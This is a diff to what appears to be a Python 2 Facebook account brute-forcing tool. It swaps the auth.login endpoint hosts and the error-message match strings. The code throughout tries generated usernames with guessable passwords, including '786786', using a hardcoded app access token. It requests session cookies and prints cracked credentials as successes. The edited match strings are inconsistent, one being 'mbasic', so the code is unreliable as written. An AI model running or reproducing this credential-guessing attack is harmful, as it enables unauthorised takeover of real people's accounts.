@@ -318,7 +318,7 @@ def action():
 
             pass1 = user
 
-            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+            data = br.open('https://free.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 
             q = json.load(data)
 
@@ -334,7 +334,7 @@ def action():
 
                 oks.append(c + user + pass1)
 
-            elif 'www.facebook.com' in q['error_msg']:
+            elif 'free.facebook.com' in q['error_msg']:
 
                 print '\x1b[1;91m  [Sucessfull-SHOBI] ' + k + c + user + '  |  ' + pass1
 
@@ -350,7 +350,7 @@ def action():
 
                 pass2 = k + c + user
 
-                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                data = br.open('https://free.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 
                 q = json.load(data)
 
@@ -366,7 +366,7 @@ def action():
 
                     oks.append(c + user + pass2)
 
-                elif 'www.facebook.com' in q['error_msg']:
+                elif 'free.facebook.com' in q['error_msg']:
 
                     print '\x1b[1;92m  [Sucessfull-SHOBI] ' + k + c + user + '  |  ' + pass2
 
@@ -382,7 +382,7 @@ def action():
 
                     pass3 = '786786'
 
-                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                    data = br.open('https://Free.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 
                     q = json.load(data)
 
@@ -398,7 +398,7 @@ def action():
 
                         oks.append(c + user + pass3)
 
-                    elif 'www.facebook.com' in q['error_msg']:
+                    elif 'mbasic.facebook.com' in q['error_msg']:
 
                         print '\x1b[1;92m  [Sucessfull-SHOBI] ' + k + c + user + '  |  ' + pass3
 
